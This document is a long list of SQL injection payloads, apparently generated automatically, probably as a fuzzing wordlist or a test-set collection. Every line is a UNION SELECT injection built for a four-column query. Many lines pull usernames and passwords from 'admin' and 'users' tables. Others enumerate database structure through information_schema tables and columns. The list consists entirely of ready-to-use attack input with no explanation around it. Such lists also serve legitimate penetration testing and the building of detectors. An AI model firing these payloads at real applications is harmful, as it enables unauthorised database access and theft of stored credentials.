1' UNION SELECT name ,type ,price ,NULL FROM products WHERE price <>'
1' UNION SELECT username ,NULL ,NULL ,NULL FROM admin WHERE username ='1
1' UNION SELECT username ,NULL ,NULL ,NULL FROM admin WHERE id ='1
1' UNION SELECT NULL ,comment ,name ,comment FROM commentsnew WHERE name ='1
1' UNION SELECT NULL ,id ,NULL ,id FROM products WHERE name ='1
1' UNION SELECT name ,NULL ,comment ,comment FROM commentsnew WHERE comment ='1
1' UNION SELECT username ,password ,NULL ,password FROM admin WHERE password ='1
1' UNION SELECT name ,name ,name ,comment FROM commentsnew WHERE comment <>'
1' UNION SELECT ROW_FORMAT ,MAX_DATA_LENGTH ,ENGINE ,TABLE_NAME FROM information_schema.tables WHERE INDEX_LENGTH ='1
1' UNION SELECT NULL ,name ,NULL ,comment FROM commentsnew WHERE name ='1
1' UNION SELECT CREATE_TIME ,CHECK_TIME ,CREATE_OPTIONS ,ROW_FORMAT FROM information_schema.tables WHERE TABLE_ROWS ='1
1' UNION SELECT NULL ,NULL ,name ,NULL FROM commentsnew WHERE comment <>'
1' UNION SELECT TABLE_CATALOG ,TABLE_ROWS ,ROW_FORMAT ,INDEX_LENGTH FROM information_schema.tables WHERE DATA_LENGTH ='1
1' UNION SELECT NULL ,id ,description ,description FROM types WHERE description <>'
1' UNION SELECT username ,id ,password ,password FROM users WHERE id ='1
1' UNION SELECT type ,NULL ,NULL ,type FROM products WHERE name ='1
1' UNION SELECT description ,name ,description ,NULL FROM types WHERE id ='1
1' UNION SELECT username ,username ,password ,password FROM users WHERE username ='1
1' UNION SELECT password ,username ,NULL ,id FROM admin WHERE password ='1
1' UNION SELECT comment ,NULL ,name ,comment FROM commentsnew WHERE name ='1
1' UNION SELECT NULL ,password ,username ,NULL FROM admin WHERE id ='1
1' UNION SELECT id ,username ,NULL ,username FROM admin WHERE id ='1
1' UNION SELECT NULL ,description ,NULL ,NULL FROM types WHERE id ='1
1' UNION SELECT name ,name ,comment ,NULL FROM commentsnew WHERE comment <>'
1' UNION SELECT CHECKSUM ,MAX_DATA_LENGTH ,VERSION ,AUTO_INCREMENT FROM information_schema.tables WHERE AUTO_INCREMENT ='1
1' UNION SELECT name ,name ,NULL ,name FROM commentsnew WHERE comment <>'
1' UNION SELECT NULL ,description ,NULL ,id FROM types WHERE id ='1
1' UNION SELECT id ,NULL ,NULL ,password FROM admin WHERE id <>'
1' UNION SELECT NULL ,images ,images ,NULL FROM image WHERE images ='1
1' UNION SELECT DATETIME_PRECISION ,ORDINAL_POSITION ,COLUMN_COMMENT ,NULL FROM information_schema.columns WHERE TABLE_CATALOG <>'
1' UNION SELECT username ,id ,password ,username FROM users WHERE password <>'
1' UNION SELECT username ,id ,password ,NULL FROM admin WHERE password <>'
1' UNION SELECT name ,price ,id ,id FROM products WHERE type <>'
1' UNION SELECT VERSION ,TABLE_COLLATION ,INDEX_LENGTH ,ENGINE FROM information_schema.tables WHERE TABLE_CATALOG ='1
1' UNION SELECT NUMERIC_PRECISION ,TABLE_SCHEMA ,IS_NULLABLE ,CHARACTER_OCTET_LENGTH FROM information_schema.columns WHERE COLUMN_NAME ='1
1' UNION SELECT type ,price ,NULL ,name FROM products WHERE name ='1
1' UNION SELECT ENGINE ,DATA_FREE ,TABLE_CATALOG ,VERSION FROM information_schema.tables WHERE CHECK_TIME ='1
1' UNION SELECT username ,username ,username ,id FROM users WHERE username ='1
1' UNION SELECT NULL ,id ,name ,type FROM products WHERE price <>'
1' UNION SELECT type ,NULL ,NULL ,id FROM products WHERE type ='1
1' UNION SELECT NULL ,NULL ,comment ,comment FROM commentsnew WHERE name ='1
1' UNION SELECT NULL ,id ,NULL ,name FROM types WHERE description ='1
1' UNION SELECT NULL ,name ,NULL ,name FROM commentsnew WHERE comment ='1
1' UNION SELECT NULL ,id ,description ,id FROM types WHERE id ='1
1' UNION SELECT ENGINE ,TABLE_COMMENT ,TABLE_NAME ,NULL FROM information_schema.tables WHERE ROW_FORMAT ='1
1' UNION SELECT AUTO_INCREMENT ,CHECKSUM ,TABLE_ROWS ,TABLE_COLLATION FROM information_schema.tables WHERE TABLE_SCHEMA ='1
1' UNION SELECT COLUMN_DEFAULT ,SRS_ID ,EXTRA ,COLUMN_KEY FROM information_schema.columns WHERE PRIVILEGES <>'
1' UNION SELECT name ,name ,comment ,name FROM commentsnew WHERE name ='1
1' UNION SELECT images ,NULL ,NULL ,images FROM image WHERE images <>'
1' UNION SELECT NULL ,type ,price ,NULL FROM products WHERE type ='1
1' UNION SELECT description ,id ,description ,NULL FROM types WHERE id ='1
1' UNION SELECT name ,name ,NULL ,comment FROM commentsnew WHERE name ='1
1' UNION SELECT NULL ,AVG_ROW_LENGTH ,TABLE_CATALOG ,TABLE_NAME FROM information_schema.tables WHERE CHECKSUM <>'
1' UNION SELECT NULL ,NULL ,id ,password FROM admin WHERE password <>'
1' UNION SELECT id ,id ,id ,password FROM users WHERE id <>'
1' UNION SELECT NULL ,images ,images ,NULL FROM image WHERE images ='1
1' UNION SELECT TABLE_CATALOG ,TABLE_NAME ,GENERATION_EXPRESSION ,CHARACTER_OCTET_LENGTH FROM information_schema.columns WHERE CHARACTER_MAXIMUM_LENGTH ='1
1' UNION SELECT id ,price ,id ,NULL FROM products WHERE id <>'
1' UNION SELECT TABLE_SCHEMA ,NULL ,DATA_FREE ,TABLE_COMMENT FROM information_schema.tables WHERE VERSION <>'
1' UNION SELECT NULL ,name ,name ,name FROM products WHERE price ='1
1' UNION SELECT NULL ,id ,name ,price FROM products WHERE name ='1
1' UNION SELECT type ,name ,name ,name FROM products WHERE name ='1
1' UNION SELECT password ,id ,password ,password FROM admin WHERE password ='1
1' UNION SELECT NULL ,description ,id ,description FROM types WHERE id ='1
1' UNION SELECT name ,name ,NULL ,price FROM products WHERE price ='1
1' UNION SELECT id ,NULL ,name ,NULL FROM types WHERE description <>'
1' UNION SELECT IS_NULLABLE ,CHARACTER_MAXIMUM_LENGTH ,COLUMN_TYPE ,CHARACTER_MAXIMUM_LENGTH FROM information_schema.columns WHERE TABLE_CATALOG ='1
1' UNION SELECT username ,NULL ,id ,NULL FROM users WHERE password <>'
1' UNION SELECT NUMERIC_SCALE ,CHARACTER_SET_NAME ,COLUMN_TYPE ,COLLATION_NAME FROM information_schema.columns WHERE COLUMN_NAME ='1
1' UNION SELECT name ,NULL ,NULL ,id FROM types WHERE description ='1
1' UNION SELECT password ,username ,NULL ,username FROM admin WHERE username ='1
1' UNION SELECT username ,id ,NULL ,username FROM admin WHERE password <>'
1' UNION SELECT images ,NULL ,NULL ,NULL FROM image WHERE images ='1
1' UNION SELECT id ,id ,password ,password FROM users WHERE id <>'
1' UNION SELECT password ,NULL ,password ,id FROM admin WHERE username ='1
1' UNION SELECT name ,name ,name ,comment FROM commentsnew WHERE comment ='1
1' UNION SELECT name ,name ,name ,NULL FROM commentsnew WHERE name <>'
1' UNION SELECT NULL ,id ,NULL ,id FROM admin WHERE username ='1
1' UNION SELECT username ,NULL ,password ,username FROM users WHERE password <>'
1' UNION SELECT CREATE_OPTIONS ,CHECK_TIME ,TABLE_COLLATION ,DATA_FREE FROM information_schema.tables WHERE DATA_FREE ='1
1' UNION SELECT NULL ,NULL ,comment ,NULL FROM commentsnew WHERE comment ='1
1' UNION SELECT NULL ,COLLATION_NAME ,COLUMN_COMMENT ,COLUMN_TYPE FROM information_schema.columns WHERE NUMERIC_SCALE <>'
1' UNION SELECT TABLE_ROWS ,DATA_FREE ,TABLE_COMMENT ,VERSION FROM information_schema.tables WHERE CHECKSUM <>'
1' UNION SELECT username ,username ,NULL ,password FROM users WHERE id ='1
1' UNION SELECT name ,comment ,name ,NULL FROM commentsnew WHERE name ='1
1' UNION SELECT username ,password ,NULL ,id FROM users WHERE username ='1
1' UNION SELECT name ,name ,comment ,NULL FROM commentsnew WHERE comment ='1
1' UNION SELECT NULL ,NULL ,NULL ,password FROM users WHERE username ='1
1' UNION SELECT images ,images ,NULL ,NULL FROM image WHERE images ='1
1' UNION SELECT type ,id ,NULL ,price FROM products WHERE type ='1
1' UNION SELECT id ,type ,NULL ,type FROM products WHERE price <>'
1' UNION SELECT COLUMN_DEFAULT ,COLUMN_KEY ,TABLE_CATALOG ,NUMERIC_PRECISION FROM information_schema.columns WHERE COLLATION_NAME ='1
1' UNION SELECT NULL ,NULL ,id ,NULL FROM users WHERE id ='1
1' UNION SELECT id ,id ,NULL ,NULL FROM admin WHERE id <>'
1' UNION SELECT username ,NULL ,id ,username FROM admin WHERE username <>'
1' UNION SELECT name ,description ,description ,NULL FROM types WHERE id <>'
1' UNION SELECT TABLE_SCHEMA ,COLUMN_TYPE ,DATA_TYPE ,TABLE_NAME FROM information_schema.columns WHERE DATETIME_PRECISION <>'
1' UNION SELECT name ,type ,price ,price FROM products WHERE id <>'
1' UNION SELECT IS_NULLABLE ,NUMERIC_PRECISION ,GENERATION_EXPRESSION ,COLLATION_NAME FROM information_schema.columns WHERE COLUMN_NAME ='1
1' UNION SELECT NULL ,description ,NULL ,NULL FROM types WHERE description ='1
1' UNION SELECT NULL ,NULL ,comment ,name FROM commentsnew WHERE name ='1
1' UNION SELECT price ,type ,type ,type FROM products WHERE type ='1
1' UNION SELECT TABLE_ROWS ,INDEX_LENGTH ,UPDATE_TIME ,DATA_LENGTH FROM information_schema.tables WHERE CHECK_TIME ='1
1' UNION SELECT images ,images ,NULL ,images FROM image WHERE images <>'
1' UNION SELECT id ,NULL ,NULL ,password FROM users WHERE id ='1
1' UNION SELECT TABLE_NAME ,COLUMN_DEFAULT ,SRS_ID ,NUMERIC_PRECISION FROM information_schema.columns WHERE COLUMN_DEFAULT <>'
1' UNION SELECT password ,password ,username ,username FROM admin WHERE username ='1
1' UNION SELECT username ,username ,id ,password FROM users WHERE username ='1
1' UNION SELECT name ,name ,name ,comment FROM commentsnew WHERE name ='1
1' UNION SELECT name ,comment ,comment ,comment FROM commentsnew WHERE name ='1
1' UNION SELECT id ,username ,password ,username FROM admin WHERE username <>'
1' UNION SELECT username ,id ,id ,id FROM users WHERE username <>'
1' UNION SELECT IS_NULLABLE ,COLUMN_TYPE ,GENERATION_EXPRESSION ,COLUMN_DEFAULT FROM information_schema.columns WHERE COLUMN_NAME ='1
1' UNION SELECT comment ,name ,comment ,name FROM commentsnew WHERE name ='1
1' UNION SELECT username ,NULL ,username ,username FROM users WHERE password ='1
1' UNION SELECT PRIVILEGES ,NUMERIC_PRECISION ,COLUMN_DEFAULT ,COLUMN_TYPE FROM information_schema.columns WHERE IS_NULLABLE ='1
1' UNION SELECT type ,price ,price ,NULL FROM products WHERE name <>'
1' UNION SELECT CREATE_OPTIONS ,TABLE_COMMENT ,MAX_DATA_LENGTH ,TABLE_COMMENT FROM information_schema.tables WHERE TABLE_ROWS ='1
1' UNION SELECT name ,NULL ,comment ,comment FROM commentsnew WHERE comment ='1
1' UNION SELECT username ,NULL ,NULL ,username FROM admin WHERE password <>'
1' UNION SELECT price ,type ,price ,name FROM products WHERE type ='1
1' UNION SELECT id ,password ,password ,id FROM admin WHERE username <>'
1' UNION SELECT password ,password ,password ,password FROM admin WHERE username ='1
1' UNION SELECT IS_NULLABLE ,NUMERIC_PRECISION ,DATA_TYPE ,CHARACTER_MAXIMUM_LENGTH FROM information_schema.columns WHERE CHARACTER_SET_NAME <>'
1' UNION SELECT images ,images ,images ,NULL FROM image WHERE images <>'
1' UNION SELECT COLUMN_DEFAULT ,TABLE_CATALOG ,PRIVILEGES ,NUMERIC_SCALE FROM information_schema.columns WHERE DATETIME_PRECISION ='1
1' UNION SELECT name ,type ,price ,id FROM products WHERE name ='1
1' UNION SELECT id ,NULL ,username ,password FROM users WHERE id ='1
1' UNION SELECT TABLE_SCHEMA ,ENGINE ,TABLE_CATALOG ,TABLE_ROWS FROM information_schema.tables WHERE TABLE_COLLATION <>'
1' UNION SELECT id ,NULL ,id ,id FROM types WHERE name <>'
1' UNION SELECT comment ,NULL ,NULL ,NULL FROM commentsnew WHERE comment ='1
1' UNION SELECT type ,name ,price ,type FROM products WHERE price ='1
1' UNION SELECT TABLE_CATALOG ,COLUMN_NAME ,TABLE_CATALOG ,DATETIME_PRECISION FROM information_schema.columns WHERE TABLE_SCHEMA <>'
1' UNION SELECT NULL ,NULL ,name ,id FROM types WHERE name <>'
1' UNION SELECT name ,id ,NULL ,name FROM types WHERE id <>'
1' UNION SELECT COLUMN_KEY ,TABLE_SCHEMA ,TABLE_SCHEMA ,IS_NULLABLE FROM information_schema.columns WHERE COLLATION_NAME <>'
1' UNION SELECT name ,name ,type ,type FROM products WHERE type ='1
1' UNION SELECT GENERATION_EXPRESSION ,DATETIME_PRECISION ,PRIVILEGES ,GENERATION_EXPRESSION FROM information_schema.columns WHERE CHARACTER_OCTET_LENGTH ='1
1' UNION SELECT NULL ,name ,description ,id FROM types WHERE description <>'
1' UNION SELECT IS_NULLABLE ,TABLE_SCHEMA ,COLLATION_NAME ,TABLE_NAME FROM information_schema.columns WHERE TABLE_SCHEMA <>'
1' UNION SELECT images ,NULL ,images ,NULL FROM image WHERE images <>'
1' UNION SELECT password ,username ,id ,username FROM users WHERE id <>'
1' UNION SELECT name ,name ,type ,price FROM products WHERE name <>'
1' UNION SELECT NULL ,NULL ,username ,password FROM users WHERE username <>'
1' UNION SELECT DATA_FREE ,TABLE_NAME ,TABLE_TYPE ,TABLE_SCHEMA FROM information_schema.tables WHERE TABLE_ROWS <>'
1' UNION SELECT COLUMN_TYPE ,DATETIME_PRECISION ,EXTRA ,NUMERIC_SCALE FROM information_schema.columns WHERE TABLE_SCHEMA <>'
1' UNION SELECT images ,NULL ,NULL ,NULL FROM image WHERE images <>'
1' UNION SELECT id ,NULL ,description ,description FROM types WHERE name ='1
1' UNION SELECT TABLE_NAME ,CREATE_TIME ,INDEX_LENGTH ,TABLE_COLLATION FROM information_schema.tables WHERE AUTO_INCREMENT ='1
1' UNION SELECT TABLE_NAME ,TABLE_CATALOG ,INDEX_LENGTH ,VERSION FROM information_schema.tables WHERE UPDATE_TIME <>'
1' UNION SELECT username ,password ,id ,password FROM users WHERE id <>'
1' UNION SELECT NULL ,NULL ,images ,NULL FROM image WHERE images ='1
1' UNION SELECT images ,images ,NULL ,images FROM image WHERE images <>'
1' UNION SELECT VERSION ,CREATE_OPTIONS ,CREATE_TIME ,UPDATE_TIME FROM information_schema.tables WHERE AVG_ROW_LENGTH ='1
1' UNION SELECT description ,name ,id ,name FROM types WHERE id ='1
1' UNION SELECT NULL ,AUTO_INCREMENT ,CREATE_TIME ,ROW_FORMAT FROM information_schema.tables WHERE DATA_FREE <>'
1' UNION SELECT id ,username ,password ,id FROM users WHERE id ='1
1' UNION SELECT description ,name ,NULL ,name FROM types WHERE id <>'
1' UNION SELECT NULL ,NULL ,NULL ,id FROM types WHERE description <>'
1' UNION SELECT GENERATION_EXPRESSION ,COLUMN_NAME ,GENERATION_EXPRESSION ,GENERATION_EXPRESSION FROM information_schema.columns WHERE DATA_TYPE ='1
1' UNION SELECT TABLE_NAME ,TABLE_SCHEMA ,DATETIME_PRECISION ,DATETIME_PRECISION FROM information_schema.columns WHERE COLLATION_NAME ='1
1' UNION SELECT NULL ,password ,password ,id FROM admin WHERE username ='1
1' UNION SELECT COLUMN_DEFAULT ,IS_NULLABLE ,NULL ,CHARACTER_OCTET_LENGTH FROM information_schema.columns WHERE TABLE_CATALOG <>'
1' UNION SELECT images ,images ,images ,NULL FROM image WHERE images <>'
1' UNION SELECT NULL ,comment ,NULL ,NULL FROM commentsnew WHERE comment ='1
1' UNION SELECT ROW_FORMAT ,TABLE_NAME ,TABLE_TYPE ,TABLE_COLLATION FROM information_schema.tables WHERE TABLE_TYPE ='1
1' UNION SELECT type ,type ,NULL ,name FROM products WHERE name ='1
1' UNION SELECT username ,username ,NULL ,username FROM users WHERE id <>'
1' UNION SELECT EXTRA ,COLUMN_COMMENT ,SRS_ID ,COLUMN_DEFAULT FROM information_schema.columns WHERE TABLE_CATALOG <>'
1' UNION SELECT id ,NULL ,username ,id FROM users WHERE username <>'
1' UNION SELECT NULL ,comment ,NULL ,NULL FROM commentsnew WHERE comment <>'
1' UNION SELECT NULL ,VERSION ,INDEX_LENGTH ,INDEX_LENGTH FROM information_schema.tables WHERE VERSION ='1
1' UNION SELECT NULL ,NULL ,username ,username FROM users WHERE id ='1
1' UNION SELECT SRS_ID ,TABLE_NAME ,PRIVILEGES ,ORDINAL_POSITION FROM information_schema.columns WHERE CHARACTER_OCTET_LENGTH <>'
1' UNION SELECT username ,password ,password ,NULL FROM users WHERE password <>'
1' UNION SELECT IS_NULLABLE ,COLUMN_DEFAULT ,EXTRA ,DATA_TYPE FROM information_schema.columns WHERE TABLE_NAME ='1
1' UNION SELECT DATA_FREE ,DATA_FREE ,TABLE_TYPE ,NULL FROM information_schema.tables WHERE CREATE_OPTIONS <>'
1' UNION SELECT description ,name ,id ,name FROM types WHERE description <>'
1' UNION SELECT name ,NULL ,comment ,comment FROM commentsnew WHERE name <>'
1' UNION SELECT COLUMN_NAME ,NUMERIC_PRECISION ,COLUMN_NAME ,COLLATION_NAME FROM information_schema.columns WHERE TABLE_NAME ='1
1' UNION SELECT images ,NULL ,images ,images FROM image WHERE images ='1
1' UNION SELECT CHARACTER_OCTET_LENGTH ,CHARACTER_OCTET_LENGTH ,COLUMN_NAME ,DATETIME_PRECISION FROM information_schema.columns WHERE DATA_TYPE ='1
1' UNION SELECT INDEX_LENGTH ,TABLE_NAME ,TABLE_COMMENT ,AVG_ROW_LENGTH FROM information_schema.tables WHERE TABLE_COMMENT <>'
1' UNION SELECT id ,id ,password ,NULL FROM users WHERE username ='1
1' UNION SELECT name ,id ,name ,NULL FROM products WHERE name ='1
1' UNION SELECT id ,username ,username ,id FROM admin WHERE password ='1
1' UNION SELECT NULL ,id ,name ,name FROM types WHERE description ='1
1' UNION SELECT COLUMN_DEFAULT ,NUMERIC_PRECISION ,EXTRA ,PRIVILEGES FROM information_schema.columns WHERE CHARACTER_OCTET_LENGTH <>'
1' UNION SELECT NULL ,NULL ,NULL ,images FROM image WHERE images <>'
1' UNION SELECT price ,NULL ,NULL ,type FROM products WHERE id <>'
1' UNION SELECT id ,name ,description ,NULL FROM types WHERE id ='1
1' UNION SELECT TABLE_COMMENT ,MAX_DATA_LENGTH ,CHECKSUM ,TABLE_COLLATION FROM information_schema.tables WHERE CREATE_TIME ='1
1' UNION SELECT NULL ,description ,NULL ,description FROM types WHERE name <>'
1' UNION SELECT name ,id ,NULL ,type FROM products WHERE type <>'
1' UNION SELECT MAX_DATA_LENGTH ,CREATE_TIME ,ROW_FORMAT ,CREATE_TIME FROM information_schema.tables WHERE DATA_LENGTH <>'
1' UNION SELECT comment ,NULL ,NULL ,NULL FROM commentsnew WHERE comment ='1
1' UNION SELECT description ,description ,description ,description FROM types WHERE name <>'
1' UNION SELECT id ,username ,password ,id FROM admin WHERE id ='1
1' UNION SELECT username ,NULL ,username ,password FROM admin WHERE username <>'
1' UNION SELECT NULL ,TABLE_ROWS ,DATA_LENGTH ,NULL FROM information_schema.tables WHERE DATA_FREE <>'
1' UNION SELECT price ,price ,type ,price FROM products WHERE id <>'
1' UNION SELECT password ,id ,password ,password FROM users WHERE username <>'
1' UNION SELECT NULL ,NULL ,id ,password FROM users WHERE username ='1
1' UNION SELECT TABLE_COMMENT ,TABLE_COLLATION ,TABLE_SCHEMA ,ROW_FORMAT FROM information_schema.tables WHERE UPDATE_TIME ='1
1' UNION SELECT description ,id ,id ,name FROM types WHERE description <>'
1' UNION SELECT comment ,name ,NULL ,comment FROM commentsnew WHERE name ='1
1' UNION SELECT username ,NULL ,password ,username FROM admin WHERE username ='1
1' UNION SELECT description ,description ,name ,NULL FROM types WHERE name ='1
1' UNION SELECT price ,id ,id ,name FROM products WHERE type <>'
1' UNION SELECT NULL ,id ,price ,name FROM products WHERE name ='1
1' UNION SELECT comment ,comment ,name ,comment FROM commentsnew WHERE comment <>'
1' UNION SELECT COLUMN_KEY ,COLUMN_TYPE ,CHARACTER_OCTET_LENGTH ,ORDINAL_POSITION FROM information_schema.columns WHERE ORDINAL_POSITION ='1
1' UNION SELECT COLUMN_DEFAULT ,ORDINAL_POSITION ,NULL ,COLLATION_NAME FROM information_schema.columns WHERE COLUMN_COMMENT ='1
1' UNION SELECT CREATE_OPTIONS ,CHECK_TIME ,TABLE_COMMENT ,DATA_LENGTH FROM information_schema.tables WHERE TABLE_COLLATION ='1
1' UNION SELECT NULL ,NULL ,NULL ,NULL FROM image WHERE images ='1
1' UNION SELECT DATETIME_PRECISION ,COLUMN_NAME ,COLUMN_NAME ,COLUMN_NAME FROM information_schema.columns WHERE TABLE_CATALOG <>'
1' UNION SELECT ENGINE ,AUTO_INCREMENT ,CREATE_OPTIONS ,MAX_DATA_LENGTH FROM information_schema.tables WHERE MAX_DATA_LENGTH <>'
